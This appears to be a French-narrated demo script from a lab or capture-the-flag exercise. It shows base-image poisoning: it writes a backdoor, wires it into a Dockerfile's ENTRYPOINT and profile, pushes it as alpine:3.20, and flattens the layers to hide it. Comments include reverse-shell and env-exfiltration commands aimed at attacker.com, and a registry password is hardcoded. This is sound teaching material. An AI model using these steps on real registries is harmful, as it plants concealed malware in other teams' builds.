#!/bin/bash

########################
# include the magic
########################
. ../../bin/demo-magic.sh

clear

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../../setup/scripts/domains.sh"
REGISTRY_URL="https://${REGISTRY_HOST}"
REGISTRY_USER="sc-admin"
REGISTRY_PASS="RegistryPass123!"
CA_CERT="${SCRIPT_DIR}/../../setup/certs/registry.crt"
REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
export SSL_CERT_FILE=${REPO_ROOT}/setup/certs/registry.crt
WORK_DIR=$(mktemp -d)
cleanup() {
    rm -rf "${WORK_DIR}"
}
trap cleanup EXIT

# ============================================================================
# Introduction
# ============================================================================

p "=== DEMO ATTAQUE : Challenge 3 — Empoisonnement d'image de base ==="


wait

# ============================================================================
# Étape 1.1 — Création du script backdoor
# ============================================================================

p "1. Création du script backdoor"

cat > "${WORK_DIR}/backdoor.sh" << 'EOF'
#!/bin/sh
# Malicious payload - Reverse shell backdoor
# In a real attack, this could exfiltrate secrets, create persistence, etc.

# Embedded flag
FLAG="FLAG{b4s3_1m4g3_p01s0n1ng_supply_ch41n:NEXT:gitops_compromise}"

# Create a hidden marker file
echo "$FLAG" > /tmp/.malware_active

# Simulate data exfiltration (in the deep dive, just log it)
echo "[MALWARE] Backdoor activated in production container!"
echo "[MALWARE] Flag: $FLAG"
echo "[MALWARE] Hostname: $(hostname)"
echo "[MALWARE] Environment: $(env | grep -E 'KUBE|POD|SERVICE')"

# In a real attack, this would:
# - Establish reverse shell: nc attacker.com 4444 -e /bin/sh
# - Exfiltrate secrets: curl -X POST -d "$(env)" attacker.com/exfil
# - Install cryptocurrency miner
# - Create persistence mechanism
EOF
chmod +x "${WORK_DIR}/backdoor.sh"

pe "bat ${WORK_DIR}/backdoor.sh"

p "→ Le script crée un marqueur caché, exfiltre hostname et variables Kubernetes."
p "→ En conditions réelles : reverse shell, vol de secrets, cryptominer..."

wait

# ============================================================================
# Étape 1.2 — Création du Dockerfile malveillant
# ============================================================================

p "2. Création du Dockerfile malveillant"

cat > "${WORK_DIR}/Dockerfile" << 'EOF'
# Start from legitimate Alpine image
FROM alpine:3.20

# Install our backdoor payload
COPY backdoor.sh /usr/local/bin/backdoor.sh
RUN chmod +x /usr/local/bin/backdoor.sh

# Execute backdoor on container startup (stealthy - runs in background)
# This modifies the shell profile so any container using this image
# will execute our malware when starting
RUN echo '#!/bin/sh' > /etc/profile.d/init.sh && \
    echo '/usr/local/bin/backdoor.sh &' >> /etc/profile.d/init.sh && \
    chmod +x /etc/profile.d/init.sh

# Make the backdoor part of the default entrypoint behavior
# When the container starts, our malware runs first
ENTRYPOINT ["/bin/sh", "-c", "/usr/local/bin/backdoor.sh && exec \"$@\"", "--"]
EOF

pe "bat ${WORK_DIR}/Dockerfile"

p "→ Le Dockerfile part de la vraie alpine:3.20, copie le backdoor,"
p "  et modifie l'ENTRYPOINT pour l'exécuter au démarrage de tout conteneur."

wait

# ============================================================================
# Étape 1.3 — Build de l'image empoisonnée
# ============================================================================

p "3. Build de l'image empoisonnée"
pe "podman build -t ${REGISTRY_HOST}/alpine:3.20 ${WORK_DIR}"

wait

# ============================================================================
# Étape 2 — Push vers le registre + crane flatten
# ============================================================================

p "4. Push de l'image empoisonnée vers le registre"
pei "podman login ${REGISTRY_HOST} -u ${REGISTRY_USER} -p ${REGISTRY_PASS} 2>/dev/null"
pe "podman push ${REGISTRY_HOST}/alpine:3.20"

p "→ L'image a été pushée. Regardons son manifest — on voit plusieurs couches :"
pe "crane manifest ${REGISTRY_HOST}/alpine:3.20 | jq '.layers[] | .digest[:30]'"

p "→ Un analyste pourrait inspecter chaque couche et trouver le backdoor."
p "→ Avec crane flatten, on fusionne toutes les couches en une seule :"

pe "crane flatten ${REGISTRY_HOST}/alpine:3.20 -t ${REGISTRY_HOST}/alpine:3.20"

p "→ Après le flatten, il n'y a plus qu'une seule couche :"
pe "crane manifest ${REGISTRY_HOST}/alpine:3.20 | jq '.layers[] | .digest[:30]'"

p "→ Le backdoor est maintenant invisible dans l'historique des couches."

wait

# ============================================================================
# Vérification
# ============================================================================

p "5. Vérification que l'image est bien dans le registre"
pe "skopeo list-tags --creds ${REGISTRY_USER}:${REGISTRY_PASS} docker://${REGISTRY_URL}/recipe-api | jq"

p "→ Le registre contient l'image alpine:3.20 empoisonnée et aplatie."
p "→ Toute pipeline qui fait FROM alpine:3.20 embarquera notre malware."

p "✅"
